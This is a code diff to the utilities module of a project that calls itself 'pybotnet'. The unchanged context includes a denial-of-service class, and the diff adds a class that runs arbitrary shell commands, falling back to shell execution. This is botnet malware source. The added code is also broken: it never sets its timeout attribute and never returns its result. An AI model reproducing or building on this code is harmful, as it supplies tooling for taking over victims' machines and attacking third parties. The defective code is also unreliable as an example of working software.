@@ -1,11 +1,14 @@
 '''Common utilities'''
 
 # pybotnet modules
+import threading
 from . import settings
 
 # import built-in & third-party modules
 import datetime
 import requests
+import subprocess
+from subprocess import TimeoutExpired
 import json
 import platform
 import time
@@ -89,6 +92,25 @@ class dos:
                 s.close()
             
             
+class execute_commands:
+
+    def __init__(self,command,timeout=120):
+        self.command = command
+    def runcommand(self):
+        try:
+            result = subprocess.check_output(self.command, shell=False, timeout=self.timeout)
+        except FileNotFoundError:
+            try:
+                result = subprocess.check_output(self.command, shell=True, timeout=self.timeout)
+            except TimeoutExpired:
+                result = "TimeOut!"
+
+
+
+
+
+        
+
 
 
 def get_current_epoc_time() -> float:
